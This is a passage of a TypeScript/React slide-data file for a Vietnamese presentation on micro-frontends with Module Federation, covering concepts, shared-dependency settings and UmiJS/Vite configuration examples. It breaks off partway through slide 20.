import { type ReactNode } from 'react';
import { motion } from 'framer-motion';
import { CodeBlock } from '../components';
import {
    MonolithVsMfeDiagram,
    ModuleFederationArchDiagram,
    TokenSyncFlowDiagram,
    ModuleLoadingFlowDiagram,
    CSSIsolationDiagram,
    RoutingFlowDiagram,
    EventBusDiagram,
    BroadcastChannelDiagram,
    MessageChannelDiagram,
    CustomEventDiagram,
    MFIntegrationTypesDiagram
} from '../diagrams';

export interface SlideData {
    id: number;
    slug?: string;
    title: string;
    section: string;
    content: ReactNode;
    variant?: 'default' | 'title' | 'section' | 'code' | 'diagram';
}

// Helper to generate slug from title
export const generateSlug = (title: string): string => {
    return title
        .toLowerCase()
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '') // Remove diacritics
        .replace(/đ/g, 'd')
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/^-+|-+$/g, '');
};

// Get slide by slug (supports index-based slugs)
export const getSlideBySlug = (slug: string, slidesList: SlideData[]): SlideData | undefined => {
    // Try exact match with index prefix first (e.g., "1-title-slug")
    const indexMatch = slug.match(/^(\d+)-/);
    if (indexMatch) {
        const index = parseInt(indexMatch[1], 10) - 1; // Convert to 0-based
        if (index >= 0 && index < slidesList.length) {
            return slidesList[index];
        }
    }
    // Fallback to legacy slug matching
    return slidesList.find(s => (s.slug || generateSlug(s.title)) === slug);
};

// Get slug for slide (uses display index for uniqueness)
export const getSlugForSlide = (slide: SlideData, slidesList?: SlideData[]): string => {
    if (slide.slug) return slide.slug;
    // Use slides array to find index, fallback to id if no array provided
    const index = slidesList ? slidesList.indexOf(slide) + 1 : slide.id;
    return `${index}-${generateSlug(slide.title)}`;
};

const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
    <motion.table
        className="w-full text-left border-collapse"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
    >
        <thead>
            <tr className="border-b-2 border-white/20">
                {headers.map((h, i) => (
                    <th key={i} className="py-3 px-4 text-[var(--accent-cyan)] font-semibold text-base">
                        {h}
                    </th>
                ))}
            </tr>
        </thead>
        <tbody>
            {rows.map((row, i) => (
                <motion.tr
                    key={i}
                    className="border-b border-white/10 hover:bg-white/5"
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: 0.1 + i * 0.05 }}
                >
                    {row.map((cell, j) => (
                        <td
                            key={j}
                            className="py-3 px-4 text-sm"
                            dangerouslySetInnerHTML={{ __html: cell }}
                        />
                    ))}
                </motion.tr>
            ))}
        </tbody>
    </motion.table>
);

export const slides: SlideData[] = [
    // ==========================================
    // PHẦN 1: GIỚI THIỆU (Slides 1-5)
    // ==========================================

    // Slide 1: Title - Creative Design
    {
        id: 1,
        title: 'Micro-Frontend với Module Federation',
        section: 'Giới thiệu',
        variant: 'title',
        content: (
            <div className="relative text-center overflow-hidden">
                {/* Dot grid background pattern */}
                <div
                    className="absolute inset-0 opacity-[0.15]"
                    style={{
                        backgroundImage: `radial-gradient(circle, rgba(255,255,255,0.3) 1px, transparent 1px)`,
                        backgroundSize: '16px 16px'
                    }}
                />

                {/* Floating gradient orbs */}
                <motion.div
                    className="absolute -top-32 -left-32 w-96 h-96 rounded-full blur-3xl"
                    style={{ background: 'radial-gradient(circle, rgba(56,189,248,0.3) 0%, transparent 70%)' }}
                    animate={{
                        x: [0, 50, 0],
                        y: [0, 30, 0],
                        scale: [1, 1.1, 1]
                    }}
                    transition={{ repeat: Infinity, duration: 8, ease: 'easeInOut' }}
                />
                <motion.div
                    className="absolute -bottom-32 -right-32 w-80 h-80 rounded-full blur-3xl"
                    style={{ background: 'radial-gradient(circle, rgba(168,85,247,0.4) 0%, transparent 70%)' }}
                    animate={{
                        x: [0, -40, 0],
                        y: [0, -30, 0],
                        scale: [1, 1.15, 1]
                    }}
                    transition={{ repeat: Infinity, duration: 10, ease: 'easeInOut' }}
                />
                <motion.div
                    className="absolute top-1/2 left-1/4 w-64 h-64 rounded-full blur-3xl"
                    style={{ background: 'radial-gradient(circle, rgba(236,72,153,0.25) 0%, transparent 70%)' }}
                    animate={{
                        x: [0, 30, 0],
                        y: [0, -20, 0]
                    }}
                    transition={{ repeat: Infinity, duration: 12, ease: 'easeInOut' }}
                />

                {/* Glass card container */}
                <motion.div
                    className="relative z-10 p-12 rounded-3xl border border-white/10 shadow-2xl"
                    style={{
                        background: 'linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.02) 100%)',
                        backdropFilter: 'blur(20px)',
                        boxShadow: '0 8px 32px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.1)'
                    }}
                    initial={{ opacity: 0, scale: 0.9, y: 30 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    transition={{ duration: 0.6 }}
                >
                    {/* Animated icon with glow */}
                    <motion.div
                        className="text-7xl mb-8 drop-shadow-2xl"
                        animate={{
                            scale: [1, 1.1, 1],
                            filter: ['drop-shadow(0 0 20px rgba(56,189,248,0.5))', 'drop-shadow(0 0 40px rgba(168,85,247,0.6))', 'drop-shadow(0 0 20px rgba(56,189,248,0.5))']
                        }}
                        transition={{ repeat: Infinity, duration: 3 }}
                    >
                        🧩
                    </motion.div>

                    {/* Title with gradient text */}
                    <motion.h1
                        className="text-6xl font-bold mb-6 leading-tight"
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.2 }}
                    >
                        <span
                            className="bg-clip-text text-transparent"
                            style={{ backgroundImage: 'linear-gradient(135deg, #38bdf8 0%, #818cf8 50%, #a855f7 100%)' }}
                        >
                            Micro-Frontend
                        </span>
                        <br />
                        <span className="text-white/90">với </span>
                        <span
                            className="bg-clip-text text-transparent"
                            style={{ backgroundImage: 'linear-gradient(135deg, #a855f7 0%, #ec4899 50%, #f97316 100%)' }}
                        >
                            Module Federation
                        </span>
                    </motion.h1>

                    {/* Subtitle with glass pill */}
                    <motion.div
                        className="inline-block px-6 py-3 rounded-full border border-white/20"
                        style={{
                            background: 'linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%)',
                            boxShadow: '0 4px 16px rgba(0,0,0,0.2), inset 0 1px 0 rgba(255,255,255,0.1)'
                        }}
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.4 }}
                    >
                        <span className="text-lg text-white/80">Từ cơ bản đến nâng cao</span>
                    </motion.div>

                    {/* Decorative line */}
                    <motion.div
                        className="mt-8 mx-auto h-1 rounded-full"
                        style={{
                            background: 'linear-gradient(90deg, transparent, rgba(168,85,247,0.6), rgba(56,189,248,0.6), transparent)',
                            width: '200px'
                        }}
                        initial={{ scaleX: 0, opacity: 0 }}
                        animate={{ scaleX: 1, opacity: 1 }}
                        transition={{ delay: 0.6, duration: 0.8 }}
                    />
                </motion.div>
            </div>
        ),
    },

    // Slide 2: Agenda
    {
        id: 2,
        title: 'Nội dung trình bày',
        section: 'Giới thiệu',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Nội dung trình bày</h2>
                <div className="grid grid-cols-2 gap-4">
                    {[
                        { num: '01', title: 'Micro-Frontend Cơ bản', desc: 'Định nghĩa, vấn đề Monolith, lợi ích' },
                        { num: '02', title: 'Module Federation', desc: 'Thuật ngữ, remoteEntry.js, Shared Dependencies' },
                        { num: '03', title: 'Cấu hình Framework', desc: 'UmiJS, Vite, Webpack config' },
                        { num: '04', title: 'Communication', desc: 'Event Bus, BroadcastChannel, Token Sync' },
                        { num: '05', title: 'Security', desc: 'Token Storage, In-memory, Defense in Depth' },
                        { num: '06', title: 'CSS Isolation', desc: 'Vấn đề CSS Conflict, CSS Modules' },
                        { num: '07', title: 'Routing', desc: 'History Sync, Single History Pattern' },
                        { num: '08', title: 'Troubleshooting', desc: 'Lỗi thường gặp & Cách fix' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.num}
                            className="glass p-4 rounded-lg flex gap-4"
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.08 }}
                        >
                            <span className="text-2xl font-bold text-[var(--accent-purple)]">{item.num}</span>
                            <div>
                                <h3 className="font-bold text-white">{item.title}</h3>
                                <p className="text-xs text-[var(--text-muted)]">{item.desc}</p>
                            </div>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 3: MFE là gì?
    {
        id: 3,
        title: 'Micro-Frontend là gì?',
        section: 'Phần 1: MFE Cơ bản',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Micro-Frontend là gì?</h2>
                <motion.div
                    className="glass p-6 rounded-xl mb-6"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                >
                    <p className="text-slide-body leading-relaxed">
                        Micro-Frontend là kiến trúc chia một ứng dụng frontend <span className="text-[var(--accent-red)]">monolithic (đơn khối)</span>
                        {" "}thành các ứng dụng <span className="text-[var(--accent-green)]">nhỏ hơn, độc lập</span>.
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '👥', title: 'Phát triển độc lập', desc: 'Mỗi team sở hữu một phần của UI' },
                        { icon: '🚀', title: 'Deploy độc lập', desc: 'Update một phần không ảnh hưởng phần khác' },
                        { icon: '🔧', title: 'Công nghệ linh hoạt', desc: 'Team A dùng React, Team B dùng Vue' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className="glass p-5 rounded-lg text-center"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 + i * 0.1 }}
                        >
                            <div className="text-3xl mb-2">{item.icon}</div>
                            <h4 className="text-[var(--accent-cyan)] font-bold text-sm">{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)] mt-1">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 4: Monolith vs MFE Diagram
    {
        id: 4,
        title: 'Monolith vs Micro-Frontend',
        section: 'Phần 1: MFE Cơ bản',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Monolith vs Micro-Frontend</h2>
                <MonolithVsMfeDiagram />
            </div>
        ),
    },

    // Slide 5: Vấn đề với Monolith
    {
        id: 5,
        title: 'Vấn đề với Monolith',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">
                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề với Monolith
                </h2>
                <Table
                    headers={['Vấn đề', 'Mô tả chi tiết']}
                    rows={[
                        ['<span class="text-[var(--accent-red)] font-bold">Build chậm</span>', 'App lớn (&gt;100K LOC) → build mất 10-30 phút'],
                        ['<span class="text-[var(--accent-red)] font-bold">Conflict nhiều</span>', '10 developers cùng merge → Git conflicts thường xuyên'],
                        ['<span class="text-[var(--accent-red)] font-bold">Coupling cao</span>', 'Thay đổi 1 module → phải test toàn bộ'],
                        ['<span class="text-[var(--accent-red)] font-bold">Deploy rủi ro</span>', 'Bug 1 feature → rollback toàn bộ app'],
                        ['<span class="text-[var(--accent-red)] font-bold">Khó scale team</span>', 'Thêm người → overhead tăng (meetings, conflicts)'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 6: Lợi ích MFE
    {
        id: 6,
        title: 'Lợi ích của Micro-Frontend',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">
                    <span className="text-[var(--accent-green)]">✅</span> Lợi ích của Micro-Frontend
                </h2>
                <Table
                    headers={['Lợi ích', 'Mô tả chi tiết']}
                    rows={[
                        ['<span class="text-[var(--accent-green)] font-bold">Build nhanh</span>', 'Mỗi app nhỏ (~10K LOC) → build 1-2 phút'],
                        ['<span class="text-[var(--accent-green)] font-bold">Team độc lập</span>', 'Team A deploy không cần đợi Team B review/merge'],
                        ['<span class="text-[var(--accent-green)] font-bold">Fault isolation</span>', 'Bug ở Products → Users vẫn hoạt động bình thường'],
                        ['<span class="text-[var(--accent-green)] font-bold">Tech flexibility</span>', 'Team mới có thể dùng framework mới (Vue 3, Solid.js)'],
                        ['<span class="text-[var(--accent-green)] font-bold">Scale dễ dàng</span>', 'Thêm team = tạo remote app mới, plug vào host'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 7: Khi nào KHÔNG nên dùng
    {
        id: 7,
        title: 'Khi nào KHÔNG nên dùng MFE?',
        section: 'Phần 1: MFE Cơ bản',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Khi nào nên / không nên dùng MFE?</h2>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-4 text-lg">❌ KHÔNG dùng khi</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• App nhỏ, 1-3 developers</li>
                            <li>• Không cần deploy độc lập</li>
                            <li>• Team nhỏ, không có vấn đề coordination</li>
                            <li>• Startup MVP cần ship nhanh</li>
                            <li>• Chưa có DevOps maturity</li>
                        </ul>
                    </motion.div>
                    <motion.div className="glass p-6 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-4 text-lg">✅ NÊN dùng khi</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• Team lớn (&gt;5 devs) hoặc nhiều team</li>
                            <li>• Cần deploy độc lập các feature</li>
                            <li>• Legacy migration dần dần</li>
                            <li>• Nhiều product lines cùng platform</li>
                            <li>• Scale organization, không chỉ code</li>
                        </ul>
                    </motion.div>
                </div>
                <motion.div className="mt-6 glass p-4 rounded-lg border border-[var(--accent-orange)]/50 text-sm text-center" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-orange)]">⚠️ Lưu ý:</strong> MFE thêm complexity đáng kể. Giải quyết vấn đề <strong>organization</strong>, không phải technical!
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 2: MODULE FEDERATION (Slides 8-15)
    // ==========================================

    // Slide 8: MF Integration Types - NEW
    {
        id: 8,
        title: 'Các phương pháp tích hợp MFE',
        section: 'Phần 2: Module Federation',
        variant: 'diagram',
        content: (
            <div className="w-full">
                <MFIntegrationTypesDiagram />
            </div>
        ),
    },

    // Slide 9: Module Federation là gì
    {
        id: 9,
        title: 'Module Federation là gì?',
        section: 'Phần 2: Module Federation',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Module Federation là gì?</h2>
                <motion.div className="glass p-6 rounded-xl mb-6" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
                    <p className="text-slide-body leading-relaxed">
                        Module Federation là plugin của <span className="text-[var(--accent-blue)] font-bold">Webpack 5</span> cho phép:
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '🌐', title: 'Load Runtime', desc: 'Load JS modules từ remote server tại runtime (không phải build time)' },
                        { icon: '📦', title: 'Không cần npm', desc: 'Không cần publish lên npm, import trực tiếp từ URL' },
                        { icon: '🔗', title: 'Share Dependencies', desc: 'Chia sẻ dependencies (React, antd) để tránh duplicate' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className="glass p-5 rounded-lg"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: 0.2 + i * 0.1 }}
                        >
                            <div className="text-3xl mb-3">{item.icon}</div>
                            <h4 className="text-[var(--accent-cyan)] font-bold text-sm mb-2">{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)]">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 10: Ví dụ đơn giản
    {
        id: 10,
        title: 'Module Federation - Ví dụ',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Ví dụ đơn giản</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <motion.div className="glass p-4 rounded-lg mb-4 border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                            <h4 className="text-[var(--accent-red)] font-bold mb-2">❌ Cách cũ: Publish npm</h4>
                            <code className="text-xs text-[var(--text-muted)]">npm install @company/product-grid</code>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-green)] font-bold mb-2">✅ Module Federation</h4>
                            <code className="text-xs text-[var(--text-muted)]">import('remote2/ProductGrid')</code>
                        </motion.div>
                    </div>
                    <CodeBlock
                        title="Host App"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Import trực tiếp từ remote
const ProductGrid = lazy(() => 
  import('remote2/ProductGrid')
);

// Webpack sẽ fetch từ:
// http://localhost:3002/remoteEntry.js`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 11: Thuật ngữ quan trọng
    {
        id: 11,
        title: 'Thuật ngữ quan trọng',
        section: 'Phần 2: Module Federation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Thuật ngữ quan trọng</h2>
                <Table
                    headers={['Thuật ngữ', 'Định nghĩa', 'Ví dụ']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">Host</span> <span class="text-[var(--text-muted)]">(Ứng dụng Cha)</span>', 'App tiêu thụ (consume) modules từ remotes', 'host-umi4 - app chính'],
                        ['<span class="text-[var(--accent-green)] font-bold">Remote</span> <span class="text-[var(--text-muted)]">(Ứng dụng Con)</span>', 'App cung cấp (expose) modules cho hosts', 'remote-vite - ProductGrid'],
                        ['<span class="text-[var(--accent-orange)] font-bold">remoteEntry.js</span>', 'File manifest chứa metadata', 'http://...3002/remoteEntry.js'],
                        ['<span class="text-[var(--accent-purple)] font-bold">Shared</span>', 'Dependencies chia sẻ giữa apps', 'react, react-dom, antd'],
                        ['<span class="text-[var(--accent-cyan)] font-bold">Singleton</span>', 'Đảm bảo chỉ 1 instance', 'React phải singleton!'],
                        ['<span class="text-[var(--accent-pink)] font-bold">Eager</span>', 'Load ngay khi app start, không lazy', 'eager: true cho React'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-blue)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5 }}>
                    <strong className="text-[var(--accent-blue)]">💡 Lưu ý:</strong> Trong code config vẫn sử dụng thuật ngữ tiếng Anh (<code>remotes</code>, <code>exposes</code>) để đồng bộ với thư viện.
                </motion.div>
            </div>
        ),
    },

    // Slide 12: remoteEntry.js
    {
        id: 12,
        title: 'remoteEntry.js là gì?',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">remoteEntry.js - File Manifest</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-4">
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                            <h4 className="text-[var(--accent-cyan)] font-bold mb-2">📦 Nội dung chứa gì?</h4>
                            <ul className="text-sm space-y-1 text-[var(--text-secondary)]">
                                <li>• Tên của remote app</li>
                                <li>• Danh sách modules được expose</li>
                                <li>• Version của shared dependencies</li>
                                <li>• Paths đến actual chunk files</li>
                            </ul>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-orange)] font-bold mb-2">🔄 Tên file theo Framework</h4>
                            <Table
                                headers={['Framework', 'Default Name']}
                                rows={[
                                    ['Webpack', 'remoteEntry.js'],
                                    ['UmiJS v4', 'remote.js'],
                                    ['Vite', 'remoteEntry.js'],
                                ]}
                            />
                        </motion.div>
                    </div>
                    <CodeBlock
                        title="Có thể đổi tên"
                        language="typescript"
                        showLineNumbers={false}
                        code={`// Vite
federation({ 
  filename: 'customRemote.js' 
})

// Webpack
new ModuleFederationPlugin({ 
  filename: 'my-entry.js' 
})`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 13: Module Loading Flow
    {
        id: 13,
        title: 'Luồng Load Module',
        section: 'Phần 2: Module Federation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Module Loading Flow</h2>
                <ModuleLoadingFlowDiagram />
            </div>
        ),
    },

    // Slide 14: Shared Dependencies
    {
        id: 14,
        title: 'Shared Dependencies',
        section: 'Phần 2: Module Federation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Cấu hình Shared Dependencies</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <Table
                            headers={['Option', 'Mô tả']}
                            rows={[
                                ['<code class="text-[var(--accent-blue)]">singleton</code>', 'Chỉ 1 instance (React BẮT BUỘC!)'],
                                ['<code class="text-[var(--accent-green)]">eager</code>', 'Load ngay, không lazy'],
                                ['<code class="text-[var(--accent-orange)]">requiredVersion</code>', 'Version tối thiểu'],
                                ['<code class="text-[var(--accent-purple)]">strictVersion</code>', 'Phải đúng version'],
                            ]}
                        />
                    </div>
                    <CodeBlock
                        title="Ví dụ đầy đủ"
                        language="typescript"
                        showLineNumbers={false}
                        code={`shared: {
  react: {
    singleton: true,  // BẮT BUỘC!
    eager: true,      // Tránh flash
    requiredVersion: '^18.0.0',
  },
  antd: { singleton: true },
  lodash: { /* Không singleton OK */ },
}`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-red)]">⚠️ Quan trọng:</strong> React PHẢI là singleton, nếu không hooks sẽ break! (Invalid hook call error)
                </motion.div>
            </div>
        ),
    },

    // Slide 15: Architecture Diagram
    {
        id: 15,
        title: 'Kiến trúc Module Federation',
        section: 'Phần 2: Module Federation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Kiến trúc Module Federation</h2>
                <ModuleFederationArchDiagram />
            </div>
        ),
    },

    // Slide 16: Bidirectional Sharing
    {
        id: 16,
        title: 'Bidirectional Sharing',
        section: 'Phần 2: Module Federation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">App vừa là Host vừa là Remote?</h2>
                <motion.div className="glass p-4 rounded-lg mb-4 border border-[var(--accent-green)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <p className="text-sm"><strong className="text-[var(--accent-green)]">✅ CÓ THỂ!</strong> Gọi là "Bidirectional Hosts"</p>
                </motion.div>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-6 rounded-lg text-center" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-blue)] font-bold mb-2">App A</h4>
                        <p className="text-xs text-[var(--text-muted)] mb-2">(host + remote)</p>
                        <div className="text-sm space-y-1">
                            <div className="text-[var(--accent-green)]">exposes: ./CompA</div>
                            <div className="text-[var(--accent-orange)]">remotes: appB</div>
                        </div>
                    </motion.div>
                    <motion.div className="glass p-6 rounded-lg text-center" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-purple)] font-bold mb-2">App B</h4>
                        <p className="text-xs text-[var(--text-muted)] mb-2">(host + remote)</p>
                        <div className="text-sm space-y-1">
                            <div className="text-[var(--accent-green)]">exposes: ./CompB</div>
                            <div className="text-[var(--accent-orange)]">remotes: appA</div>
                        </div>
                    </motion.div>
                </div>
                <motion.div className="mt-4 text-center text-[var(--accent-cyan)] text-2xl" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    ◄───────────────►
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 3: CẤU HÌNH FRAMEWORK (Slides 16-19)
    // ==========================================

    // Slide 17: Library Recommendations
    {
        id: 17,
        title: 'Library Recommendations',
        section: 'Phần 3: Cấu hình Framework',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Library theo Platform</h2>
                <Table
                    headers={['Platform', 'Library', 'Lý do đề xuất']}
                    rows={[
                        ['<span class="text-[var(--accent-blue)] font-bold">Webpack</span>', 'ModuleFederationPlugin', 'Native, best documented'],
                        ['<span class="text-[var(--accent-green)] font-bold">UmiJS v3/v4</span>', '@umijs/plugin-mf', 'Zero config, tích hợp sẵn'],
                        ['<span class="text-[var(--accent-purple)] font-bold">Vite</span>', '@originjs/vite-plugin-federation', 'Stable, community-tested'],
                        ['<span class="text-[var(--accent-orange)] font-bold">Next.js</span>', '@module-federation/nextjs-mf', 'Official, SSR support'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-cyan)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Note:</strong> Theo dõi Module Federation 2.0 (Universe) của ByteDance cho hỗ trợ SSR và App Router tốt hơn.
                </motion.div>
            </div>
        ),
    },

    // Slide 17: UmiJS Host Config
    {
        id: 17,
        title: 'UmiJS - Host Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">UmiJS v4 - Host Configuration</h2>
                <CodeBlock
                    title="host-umi4/.umirc.ts"
                    language="typescript"
                    code={`import { defineConfig } from '@umijs/max';

export default defineConfig({
  mf: {
    name: 'hostUmi4',
    remotes: [
      { name: 'remote1', entry: 'http://localhost:3001/remote.js' },
      { name: 'remote2', entry: 'http://localhost:3002/assets/remoteEntry.js' },
    ],
    shared: {
      react: { singleton: true, eager: true },
      'react-dom': { singleton: true, eager: true },
      antd: { singleton: true },
    },
  },
});`}
                    highlightLines={[6, 7, 8, 11, 12]}
                />
            </div>
        ),
    },

    // Slide 18: UmiJS Remote Config
    {
        id: 18,
        title: 'UmiJS - Remote Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">UmiJS v4 - Remote Configuration</h2>
                <CodeBlock
                    title="remote-umi/.umirc.ts"
                    language="typescript"
                    code={`export default defineConfig({
  mfsu: false,  // ⚠️ QUAN TRỌNG: Tắt MFSU

  mf: {
    name: 'remote1',
    library: { type: 'var', name: 'remote1' },
    exposes: {
      './UserList': './src/components/UserList',
      './UserDetail': './src/components/UserDetail',
    },
    shared: {
      react: { singleton: true },
      'react-dom': { singleton: true },
    },
  },
});`}
                    highlightLines={[2, 7, 8, 9]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-orange)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-orange)]">⚠️ Quan trọng:</strong> Phải tắt <code>mfsu: false</code> khi làm remote app!
                </motion.div>
            </div>
        ),
    },

    // Slide 19: Vite Remote Config
    {
        id: 19,
        title: 'Vite - Remote Config',
        section: 'Phần 3: Cấu hình Framework',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">React + Vite - Remote Configuration</h2>
                <CodeBlock
                    title="vite.config.ts"
                    language="typescript"
                    code={`import federation from '@originjs/vite-plugin-federation';

export default defineConfig({
  plugins: [
    react(),
    federation({
      name: 'remote2',
      filename: 'remoteEntry.js',
      exposes: {
        './ProductGrid': './src/components/ProductGrid',
      },
      shared: ['react', 'react-dom', 'antd'],
    }),
  ],
  build: { target: 'esnext' },
});`}
                    highlightLines={[6, 9, 10, 12]}
                />
            </div>
        ),
    },

    // Slide 20: Tại sao cả Host và Remote đều khai báo Shared?
    {
        id: 20,
        title: 'Tại sao Remote cũng khai báo Shared?',
        section: 'Phần 3: Cấu hình Framework',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Tại sao cả Host và Remote đều khai báo Shared?</h2>
                <div className="grid grid-cols-2 gap-6">
                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }}>
                        <h4 className="text-[var(--accent-blue)] font-bold mb-3">1. Build-time độc lập</h4>
                        <p className="text-sm text-[var(--text-secondary)]">
                            Mỗi app được build riêng biệt. Lúc build, Remote không biết Host có gì → Remote phải nói "tôi cần React và sẵn sàng share".
                        </p>
                    </motion.div>
                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.1 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-3">2. Standalone mode</h4>
                        <p className="text-sm text-[var(--text-secondary)]">
